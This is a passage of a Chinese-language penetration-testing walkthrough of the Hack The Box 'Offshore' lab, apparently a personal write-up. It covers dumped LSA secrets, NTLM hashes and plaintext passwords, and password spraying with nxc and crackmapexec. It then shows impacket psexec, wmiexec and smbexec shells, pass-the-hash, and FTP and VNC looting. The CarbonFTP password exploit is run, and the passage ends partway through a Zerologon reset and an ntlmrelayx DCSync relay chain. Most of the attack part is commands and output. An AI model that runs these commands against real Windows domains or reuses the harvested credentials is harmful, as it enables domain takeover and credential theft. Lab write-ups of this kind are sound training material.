CORP\WSADM$:des-cbc-md5:805e61fe547aadef
CORP\WSADM$:plain_password_hex:4d00390066002c0044007a0066002a00350074004d0039003e00270042006a0047006800480060003b004b004500540045004b004c00630051003b004b0026004e00510067002f00670047005200470053004a004600730027004e0070005c0061006800250028004f0042005e00610058004c006a004e0061005b00310065004200220061003e002b0055005e003c007a0060006a00270043006100220054005a0056003d0066006d002b004200420044005700260074002f003f00300048006d00290052003e0029005a006b0063007300770046006b007a003a00380050005100460070002a00620021003e003400
CORP\WSADM$:aad3b435b51404eeaad3b435b51404ee:19f221a69c0693ebfdc064393b55d509:::
[*] DefaultPassword 
CORP\wsadmin:Workstationadmin1!
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x318861197daf7ee8e404267b8e5a64381556246e
dpapi_userkey:0x8c35885fcf74e551b5139a7742808dd0b62b7c27
[*] L$_SQSA_S-1-5-21-1722741643-2714478462-3020786435-1001 
Security Questions for user S-1-5-21-1722741643-2714478462-3020786435-1001: 
 - Version : 1
[*] NL$KM 
 0000   FC 29 9A F7 E3 96 D5 39  FD FF 6A 8F 2E 6A AE 34   .).....9..j..j.4
 0010   A1 D6 12 E6 81 8D 8E B2  5F C5 6F 4E D9 70 DC 1F   ........_.oN.p..
 0020   A6 07 0D BD A6 71 75 D6  D0 AC 24 FB F3 00 DD 26   .....qu...$....&
 0030   96 19 3B 2B A2 09 78 90  98 53 3E 02 06 0C 6E F0   ..;+..x..S>...n.
NL$KM:fc299af7e396d539fdff6a8f2e6aae34a1d612e6818d8eb25fc56f4ed970dc1fa6070dbda67175d6d0ac24fbf300dd2696193b2ba209789098533e02060c6ef0
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry

```

---

#### 🔓 第四步：破解 NTLM（我没进行）
保存 hash 到文件：

```plain
hashes.txt
```

用 hashcat：

```plain
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

+ -m 1000 = NTLM

## 横向移动
### 凭据分析
#### ① 本地 SAM（价值一般）
```plain
hacker:1005:...:bec28a3aa11811760131128a6b8b8833
justalocaladmin:...:ecc47db5f4b0a6b3ca062361f9b3ef8f
```

可以横向尝试，但不是重点。

---

#### ② Cached Domain Credentials（DCC2）
```plain
CORP.LOCAL/wsadmin
CORP.LOCAL/ned.flanders_adm
```

这是缓存登录 hash（不能直接 PTH），需要 hashcat -m 2100 爆破。

但也不是你现在最强的武器。

---

#### ③ 真正的大杀器：LSASS dump
你拿到了：

---

##### 🏆 wsadmin NTLM
```plain
wsadmin
NTLM: 669b12a3bac275251170afbe2c5de8c2
```

Logon Server: DC01  
说明这是域账号，并且刚登录过域控。

---

##### 🏆 ned.flanders_adm NTLM
```plain
NTLM: deff72637376f94d8e6c3fab3270f65d
```

---

##### 🏆 机器账户 NTLM
```plain
WSADM$
NTLM: 19f221a69c0693ebfdc064393b55d509
kerberos 明文密码：M9f,Dzf*5tM9>'BjGhH`;KETEKLcQ;K&NQg/gGRGSJFs'Np\ah%(OB^aXLjNa[1eB"a>+U^<z`j'Ca"TZV=fm+BBDW&t/?0Hm)R>)ZkcswFkz:8PQFp*b!>4
```

---

#### ④ LSA Secret 明文密码
```plain
[*] DefaultPassword 
CORP\wsadmin:Workstationadmin1!
```

这是明文。

这比 NTLM 还强。

### 尝试一(直接冲DC)
#### 指令
```plain
12/02/2026 10:13:36 [Neo] Demon » shell nslookup DC01 
[*] [82D5EBC4] Tasked demon to execute a shell command
[+] Send Task to Agent [128 bytes]
[+] Received Output [144 bytes]:
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  172.16.1.5

Name:    DC01.corp.local
Address:  172.16.1.5
```

```plain
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q impacket-secretsdump CORP/wsadmin:'Workstationadmin1!'@172.16.1.5

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[-] DRSR SessionError: code: 0x20f7 - ERROR_DS_DRA_BAD_DN - The distinguished name specified for this replication operation is invalid.
[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter
[*] Cleaning up... 

```

 ✅ 凭据是正确的（已经成功认证到 DC）  
❌ 但 wsadmin 不是 Domain Admin  
❌ 没有 DCSync 权限  

####  结论  
`wsadmin` 不是域管理员  
只是普通域用户（可能是本机管理员）

所以：

```plain
DRSUAPI 方法失败
```

因为它需要：

+ Replicating Directory Changes
+ Replicating Directory Changes All

这两个权限只有 Domain Admin / Enterprise Admin / 受委派账户才有。

### 尝试二(密码喷洒)
#### nxc
```plain
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q nxc smb 172.16.1.0/24 -u wsadmin -p 'Workstationadmin1!'

SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:corp.local) (signing:True) (SMBv1:True) (Null Auth:True)                                                     
SMB         172.16.1.15     445    SQL01            [*] Windows Server 2016 Standard 14393 x64 (name:SQL01) (domain:corp.local) (signing:False) (SMBv1:True)
SMB         172.16.1.30     445    MS01             [*] Windows Server 2016 Standard 14393 x64 (name:MS01) (domain:corp.local) (signing:False) (SMBv1:True)
SMB         172.16.1.220    445    SRV01            [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:LAB.OFFSHORE.LOCAL) (signing:True) (SMBv1:True) (Null Auth:True)                                            
SMB         172.16.1.26     445    FS01             [*] Windows Server 2016 Standard 14393 x64 (name:FS01) (domain:corp.local) (signing:False) (SMBv1:True)
SMB         172.16.1.101    445    WS02             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS02) (domain:corp.local) (signing:False) (SMBv1:True) (Null Auth:True)                                            
SMB         172.16.1.24     445    WEB-WIN01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WEB-WIN01) (domain:corp.local) (signing:False) (SMBv1:None)
SMB         172.16.1.200    445    DC0              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC0) (domain:LAB.OFFSHORE.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)                                            
SMB         172.16.1.36     445    WSADM            [*] Windows 10 / Server 2019 Build 19041 x64 (name:WSADM) (domain:corp.local) (signing:False) (SMBv1:None)
SMB         172.16.1.201    445    JOE-LPTP         [*] Windows 10 / Server 2019 Build 19041 x64 (name:JOE-LPTP) (domain:JOE-LPTP) (signing:False) (SMBv1:None)
SMB         172.16.1.5      445    DC01             [+] corp.local\wsadmin:Workstationadmin1!
SMB         172.16.1.30     445    MS01             [+] corp.local\wsadmin:Workstationadmin1!
SMB         172.16.1.15     445    SQL01            [+] corp.local\wsadmin:Workstationadmin1!
SMB         172.16.1.220    445    SRV01            [-] LAB.OFFSHORE.LOCAL\wsadmin:Workstationadmin1! STATUS_LOGON_FAILURE
SMB         172.16.1.26     445    FS01             [+] corp.local\wsadmin:Workstationadmin1!
SMB         172.16.1.101    445    WS02             [+] corp.local\wsadmin:Workstationadmin1! (Pwn3d!)
SMB         172.16.1.24     445    WEB-WIN01        [+] corp.local\wsadmin:Workstationadmin1!
SMB         172.16.1.200    445    DC0              [-] LAB.OFFSHORE.LOCAL\wsadmin:Workstationadmin1! STATUS_LOGON_FAILURE
SMB         172.16.1.36     445    WSADM            [+] corp.local\wsadmin:Workstationadmin1! (Pwn3d!)
SMB         172.16.1.201    445    JOE-LPTP         [-] 
```

#### 权限版图
| 机器名 | IP | 状态 |
| --- | --- | --- |
| DC01 | 172.16.1.5 | ✅ 可登录 |
| SQL01 | 172.16.1.15 | ✅ 可登录 |
| MS01 | 172.16.1.30 | ✅ 可登录 |
| FS01 | 172.16.1.26 | ✅ 可登录 |
| WEB-WIN01 | 172.16.1.24 | ✅ 可登录 |
| WS02 | 172.16.1.101 | ✅ Pwn3d!（本地管理员） |
| WSADM | 172.16.1.36 | ✅ Pwn3d!（本地管理员） |


# 172.16.1.101(Windows)（Setp:4）
## 端口扫描
```c
export ip=172.16.1.101; for port in $(seq 1 15000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 135
Port open 139
Port open 445
Port open 3389
Port open 5357
Port open 5985
```

## SMB凭据
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q crackmapexec smb 172.16.1.1/24 -u usersname -p pass 

SMB         172.16.1.101    445    WS02             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS02) (domain:corp.local) (signing:False) (SMBv1:True)
SMB         172.16.1.101    445    WS02             [+] corp.local\ned.flanders_adm:Lefthandedyeah! 
```

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q nxc smb 172.16.1.0/24 -u wsadmin -p 'Workstationadmin1!'

SMB         172.16.1.101    445    WS02             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS02) (domain:corp.local) (signing:False) (SMBv1:True) (Null Auth:True)                                            
```

得到管理员凭据wsadmin/Workstationadmin1!

## 远程登录
### ✅方法1：psexec（最常用）
```plain
proxychains -q impacket-psexec corp.local/wsadmin:'Workstationadmin1!'@172.16.1.101
```

如果成功，会直接给你一个 SYSTEM shell。

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q impacket-psexec corp.local/wsadmin:'Workstationadmin1!'@172.16.1.101
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 172.16.1.101.....
[*] Found writable share ADMIN$
[*] Uploading file IRPFgDRe.exe
[*] Opening SVCManager on 172.16.1.101.....
[*] Creating service djSO on 172.16.1.101.....
[*] Starting service djSO.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

---

### ✅方法2：wmiexec（更隐蔽）
```plain
proxychains -q impacket-wmiexec corp.local/wsadmin:'Workstationadmin1!'@172.16.1.101
```

优点：

+ 不落地服务
+ 不写文件

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q impacket-wmiexec corp.local/wsadmin:'Workstationadmin1!'@172.16.1.101
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

---

### ✅ 方法3：smbexec
```plain
proxychains -q impacket-smbexec corp.local/wsadmin:'Workstationadmin1!'@172.16.1.101
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-smbexec corp.local/wsadmin:'Workstationadmin1!'@172.16.1.101
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

---

### ❌ 方法4：rdp
先确认 3389 开没开：

```plain
proxychains -q nxc rdp 172.16.1.101 -u wsadmin -p 'Workstationadmin1!'
```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q nxc rdp 172.16.1.101 -u wsadmin -p 'Workstationadmin1!'
[*] Initializing RDP protocol database
                                                        
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# 
```

如果开着（虽然这里没有开）：

```plain
proxychains -q xfreerdp /u:wsadmin /p:Workstationadmin1! /d:corp.local /v:172.16.1.101
```

## Getflag
```c
C:\Users\wsadmin\Desktop> type flag.txt
OFFSHORE{mimikatz_d03s_th3_j0b}
```

## 凭据发现
```c
 Directory of C:\

06/25/2018  10:14 PM    <DIR>          Backups
07/13/2009  10:20 PM    <DIR>          PerfLogs
01/29/2025  08:51 AM    <DIR>          Program Files
02/08/2018  04:50 PM    <DIR>          Program Files (x86)
04/17/2021  01:33 PM    <DIR>          Users
02/12/2026  10:49 AM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)   9,943,756,800 bytes free
```

发现Backups

### web.config_sample
```c
type c:\Backups\web.config_sample
<configuration>      
    <system.web>      
        <authentication mode="Forms">      
            <credentials passwordFormat="Clear">      
                <user name="svc_iis" password="Vintage!" />      
            </credentials>      
        </authentication>      
        <authorization>      
            <allow users="test" />      
            <deny users="*" />      
        </authorization>      
    </system.web>      
    <location path="admin">
        <system.web>
            <authorization>              
                <allow roles="admin" />
                <deny users="*"/>
            </authorization>
        </system.web>
    </location> 
    <system.webServer>      
        <directoryBrowse enabled="true" />      
        <security>      
            <authentication>      
                <anonymousAuthentication enabled="false" />      
                <basicAuthentication enabled="true" />      
                <windowsAuthentication enabled="false" />      
            </authentication>      
        </security>      
    </system.webServer>      
</configuration>
```

拿到了用户凭据svc_iis/Vintage!

### 阶段判断
目前仅剩两个web程序了

```c
172.16.1.22:3000 open   凭据回显：Required authorization token not found
172.16.1.24:80 open    offshore dev js登录框
```

所以下一步前往172.16.1.24靶机

# 172.16.1.201(Windows)（Setp:15）
## 端口扫描
```c
export ip=172.16.1.201; for port in $(seq 1 15000); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo Port open $port || echo Port closed $port > /dev/null" 2>/dev/null; done
Port open 21
Port open 80
Port open 135
Port open 139
Port open 445
Port open 5040
Port open 5800
Port open 5900
Port open 5985
```

## ftp匿名登录
```c
┌──(web)─(root㉿kali)-[/home/kali]
└─# proxychains -q ftp anonymous@172.16.1.201
Connected to 172.16.1.201.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||64923|)
125 Data connection already open; Transfer starting.
10-18-20  12:57PM       <DIR>          .dbus-keyrings
10-11-20  06:01PM       <DIR>          .vscode
10-10-20  09:13PM       <DIR>          3D Objects
10-10-20  09:13PM       <DIR>          Contacts
08-01-22  09:05PM       <DIR>          Desktop
10-18-20  12:57PM       <DIR>          Documents
04-17-21  09:03AM       <DIR>          Downloads
10-10-20  09:13PM       <DIR>          Favorites
10-10-20  09:13PM       <DIR>          Links
10-24-20  09:42AM       <DIR>          Music
10-22-20  04:31AM       <DIR>          OneDrive
10-11-20  05:52PM       <DIR>          Pictures
10-10-20  09:13PM       <DIR>          Saved Games
10-10-20  09:15PM       <DIR>          Searches
10-16-20  04:31PM       <DIR>          Videos
```

卡住关键在这一行：

```plain
229 Entering Extended Passive Mode (|||64923|)
125 Data connection already open; Transfer starting.
```

FTP 有 **两条连接**：

1. **控制连接**（21端口）
2. **数据连接**（随机端口，这里是 64923）

你现在用了 **proxychains**，而 FTP 在 **EPSV/PASV 模式下会重新开一个端口**，proxychains 经常 **转发不了第二条数据连接**，所以就会表现为：

```plain
Transfer starting
然后卡住
```

其实就是 **数据通道没连上**。

###  关闭被动模式 (错误操作)
```c
ftp> passive
Passive mode: off; fallback to active mode: off.
```

关了发现连不回来了...直接凑活用吧，卡住然后Ctrl+C

### Getflag1
```c
ftp> cd Desktop
250 CWD command successful.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||64931|)
125 Data connection already open; Transfer starting.
100% |***********************************************************|    31        0.02 KiB/s    00:00 ETAftp: Reading from network: 被中断的系统调用
  0% |                                                           |    -1        0.00 KiB/s    --:-- ETA
226 Transfer complete.
```

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ cat flag.txt           
OFFSHORE{st0p_us1ng_fr33warez!}  
```

**没有 **`**AppData**`，但这在 **Microsoft Windows** 的 **FTP 访问里是正常的**。

原因是 **Microsoft Internet Information Services 的 FTP 服务默认会隐藏系统目录**。

### 为什么看不到 AppData
`AppData` 在 Windows 中是：

```plain
Hidden + System
```

而 IIS FTP 默认：

```plain
隐藏 Hidden / System 目录
```

### Getflag2
```c
ftp> cd /AppData/Roaming/Neowise/CarbonFTPProjects
250 CWD command successful.
ftp> ls
229 Entering Extended Passive Mode (|||64933|)
125 Data connection already open; Transfer starting.
10-11-20  08:12PM                   39 flag.txt
10-11-20  08:25PM                  440 FNJVN5SA.CFTP
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||64935|)
125 Data connection already open; Transfer starting.
100% |***********************************************************|    39        0.03 KiB/s    00:00 ETAftp: Reading from network: 被中断的系统调用
  0% |                                                           |    -1        0.00 KiB/s    --:-- ETA
226 Transfer complete.
ftp> 
```

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ cat flag.txt 
OFFSHORE{An0N_FtP_c@n_rev3al_tr3asUre$} 
```

### 敏感文件
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q ftp anonymous@172.16.1.201
Connected to 172.16.1.201.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> cd /AppData/Roaming/Neowise/CarbonFTPProjects
250 CWD command successful.
ftp> get FNJVN5SA.CFTP
local: FNJVN5SA.CFTP remote: FNJVN5SA.CFTP
229 Entering Extended Passive Mode (|||64936|)
125 Data connection already open; Transfer starting.
100% |***********************************************************|   440        0.42 KiB/s    00:00 ETAftp: Reading from network: 被中断的系统调用
  0% |                                                           |    -1        0.00 KiB/s    --:-- ETA
226 Transfer complete.
ftp> 
```

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ cat FNJVN5SA.CFTP
[Root]
Caption=STRING|"Joe_IIS"
Exact=INTEGER|0
ExcludeMasks=STRING|""
IncludeMasks=STRING|"*.*"
LocalFolder=STRING|"C:\inetpub"
Passive=INTEGER|0
Password=STRING|"19852327402859129171335082736410993"
Port=INTEGER|21
ProxyKind=INTEGER|0
ProxyPort=INTEGER|21
ProxyServer=STRING|""
RemoteFolder=STRING|"/"
Server=STRING|"ftp.offshore.local"
SubFilders=INTEGER|0
SyncMode=INTEGER|2
UseProxy=INTEGER|0
UserName=STRING|"joe"
```

## 密码破解
![](/image/prolabs/Offshore-60.png)

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ python passwd.py -p 19852327402859129171335082736410993
[+] Neowise CarbonFTP v1.4
[+] CVE-2020-6857 Insecure Proprietary Password Encryption
[+] Version 2 Exploit fixed for Python 3 compatibility
[+] Discovered and cracked by hyp3rlinx
[+] ApparitionSec

 Decrypting ... 

[-] 19852
[-] 32740
[-] 28591
[-] 29171
[-] 33508
[-] 27364
[-] 10993
[+] PASSWORD LENGTH: 13
[*] DECRYPTED PASSWORD: Dev0ftheyear!
```

## VNC连接
目标端口开放5900，该端口默认为VNC服务

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q vncviewer 172.16.1.201:5900      
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Password: 
Authentication successful
Desktop name "joe-lptp"
VNC server default format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Using default colormap which is TrueColor.  Pixel format:
  32 bits per pixel.
  Least significant byte first in each pixel.
  True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0
Same machine: preferring raw encoding
```

输入密码：Dev0ftheyear!

![](/image/prolabs/Offshore-61.png)

卧槽好卡好卡好卡

![](/image/prolabs/Offshore-62.png)

### Getflag
![](/image/prolabs/Offshore-63.png)

```c
OFFSHORE{st0p_us1ng_fr33warez!}
```

### 打开7z
![](/image/prolabs/Offshore-64.png)

访问PhysicalDrive0

![](/image/prolabs/Offshore-65.png)

访问2.img进入磁盘根目录可访问所有的文件

```c
\\.\PhysicalDrive0\2.img\Windows\System32\config\
```

这里面复制 sam security system三个文件

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q evil-winrm -i 172.16.1.201 -u joe
Enter Password: Dev0ftheyear!
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\joe\Documents> cd /new
*Evil-WinRM* PS C:\new> dir


    Directory: C:\new


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/1/2025   4:26 AM          65536 SAM
-a----          4/1/2025   4:26 AM          65536 SECURITY
-a----          4/1/2025   4:26 AM       12320768 SYSTEM

*Evil-WinRM* PS C:\new> download SAM
                                        
Info: Downloading C:\new\SAM to SAM
                                        
Info: Download successful!
*Evil-WinRM* PS C:\new> download SYSTEM
                                        
Info: Downloading C:\new\SYSTEM to SYSTEM

Info: Download successful!

*Evil-WinRM* PS C:\new> download SECURITY
                                        
Info: Downloading C:\new\SECURITY to SECURITY
                                        
Info: Download successful!
```

## secretsdump
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8d1b3bcb293ec2bacf262ca05e9827c9
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:49a332d455162a446ead15763e45817e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7025790b5bb6b1c87aff52f9fd307ce1:::
joe:1001:aad3b435b51404eeaad3b435b51404ee:4568151a41ac1b353f40f4dc7f90f19d:::
[*] Cleaning up... 
```

## Getflag
```c
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type flag.txt
OFFSHORE{b1ts_pl3ase_yall!}
```

## CherryTree
![](/image/prolabs/Offshore-66.png)

```c
内部测试

在野外广泛利用了 **CVE-2020-1472** 漏洞
服务器团队对立即修补公司内部（CORP、DEV、ADMIN、CLIENT）域控制器的影响不了解 —— 担心匆忙打未知补丁
Todd 发了一篇文章： [https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/](https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/)

  攻击会生成事件代码 5805、4624 和 4742 —— 对这些事件的响应是否足以阻止漏洞利用，同时进一步测试补丁？
  运行以下操作会有什么影响，以防止成功利用？ [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1)
缓解措施目前似乎有效
在 SRV01 上安装了补丁
高层决定对所有 4 台域控制器推送紧急补丁……
需要在审计人员到来之前停用域
```

## Administrator登录
```c
proxychains -q impacket-wmiexec ./administrator@172.16.1.201 -hashes :49a332d455162a446ead15763e45817e
```

## Getflag
```c
type \users\administrator\Desktop\flag.txt
OFFSHORE{b1ts_pl3ase_yall!}
```

## 横向移动
### 分析
根据CherryTree中的Internal testing我们得知

> **漏洞背景（CVE-2020-1472）**
>
> + 这是 **“Zerologon”** 漏洞，一个针对 **Windows 域控制器（DC）** 的严重身份验证漏洞。
> + 利用它，攻击者可以 **无需密码** 就把自己提升为域管理员，完全控制域环境。
> + 影响范围是企业内部所有域控制器（CORP、DEV、ADMIN、CLIENT）。
>
> **缓解措施**
>
> + 当前的 **缓解措施似乎有效**（mitigation seems to work for now）。
> + 已在一台域控制器（SRV01）上安装了补丁。
> + 高层决定对 ** 4 台域控制器** 推送紧急补丁。
>

但是剩下的172.16.1.200和172.16.1.220并不属于补丁域当中

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q crackmapexec smb 172.16.1.200             
SMB         172.16.1.200    445    DC0              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC0) (domain:LAB.OFFSHORE.LOCAL) (signing:True) (SMBv1:False)
                                                                                                        
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q crackmapexec smb 172.16.1.220
SMB         172.16.1.220    445    SRV01            [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:LAB.OFFSHORE.LOCAL) (signing:True) (SMBv1:True)
```

他俩同属于LAB.OFFSHORE.LOCAL域

因此我们需要通过**Zerologon漏洞进行攻击**

### **Zerologon**验证
[https://github.com/bvcyber/CVE-2020-1472/tree/master](https://github.com/bvcyber/CVE-2020-1472/tree/master)

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/CVE-2020-1472]
└─# proxychains -q python zerologon_tester.py DC0 172.16.1.200
Performing authentication attempts...
====================================================
Success! DC can be fully compromised by a Zerologon attack.
```

存在漏洞

### **Zerologon**利用
[https://github.com/dirkjanm/CVE-2020-1472](https://github.com/dirkjanm/CVE-2020-1472)

使用`cve-2020-1472-exploit.py`将机器账户重置

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/CVE-2020-1472]
└─# proxychains -q python cve-2020-1472-exploit.py DC0 172.16.1.200
Performing authentication attempts...
==========
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```

###  DCSync(失败)
```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/CVE-2020-1472]
└─# proxychains -q secretsdump.py \
'LAB.OFFSHORE.LOCAL/DC0$@172.16.1.200' \
-no-pass \
-just-dc
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: SMB SessionError: code: 0xc000006d - STATUS_LOGON_FAILURE - The attempted logon is invalid. This is either due to a bad username or authentication information.
[*] Cleaning up... 
```

失败了 我不理解

### 凭据复用
根据我们在172.16.1.201得到的凭据，尝试复用

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/CVE-2020-1472]
└─# proxychains -q crackmapexec smb 172.16.1.200 -u joe -p 'Dev0ftheyear!'
SMB         172.16.1.200    445    DC0              [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC0) (domain:LAB.OFFSHORE.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.1.200    445    DC0              [+] LAB.OFFSHORE.LOCAL\joe:Dev0ftheyear! 
                                                                                                        
┌──(web)─(root㉿kali)-[/home/kali/Desktop/tools/CVE-2020-1472]
└─# proxychains -q crackmapexec smb 172.16.1.220 -u joe -p 'Dev0ftheyear!'
SMB         172.16.1.220    445    SRV01            [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:LAB.OFFSHORE.LOCAL) (signing:True) (SMBv1:True)
SMB         172.16.1.220    445    SRV01            [+] LAB.OFFSHORE.LOCAL\joe:Dev0ftheyear!                                                                                        
```

### **Zerologon**变种
[ZeroLogon | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/netlogon/zerologon)

```c
背景:
1. 前提是我们需要知道一个域内的凭据  joe:Dev0ftheyear!
2. 172.16.1.200是dc0
3. 172.16.1.220是域内的机器
```

**Zerologon + NTLM Relay + DCSync 的组合打法**。  
和传统 Zerologon（重置 DC 机器账户密码）不同，这种方法 **不用改密码**，而是：

```plain
强制机器认证
↓
NTLM Relay
↓
利用 Zerologon 绕过 Netlogon 安全
↓
直接执行 DCSync
↓
拿到 Administrator hash
```

#### 攻击流程总览
整个链条：

```plain
Attacker
   │
   │ 1. ntlmrelayx 监听
   ▼
SRV01 被强制认证
   │
   │ 2. NTLM relay
   ▼
DC0 Netlogon
   │
   │ 3. Zerologon bypass
   ▼
DCSync
   │
   ▼
Administrator hash
```

---

#### 第一步：启动 NTLM Relay
必须开启 **SMB2 支持**：

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# ntlmrelayx.py -t dcsync://172.16.1.200 -smb2support --no-multirelay
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

解释：

```plain
-t dcsync://172.16.1.200
```

表示：

```plain
Relay 成功后
直接执行 DCSync
```

如果成功会看到类似：

```plain
[*] DCSYNC attack successful
```

为什么要循环触发

因为PrinterBug 本身是“概率触发”

PrinterBug 调用的是：

```plain
RpcRemoteFindFirstPrinterChangeNotificationEx
```

这个 RPC 会让目标机器：

```plain
SRV01 → 回连 SMB 到你
```

但 Windows 的 **Spooler 实现并不保证每次都会回连**。

常见情况：

```plain
触发 1 次 → 没回连
触发 2 次 → 没回连
触发 3 次 → 回连
```

所以很多 exploit 都写成 **循环触发**。

---

#### 第二步：强制 SRV01 进行身份认证
[https://github.com/dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx)

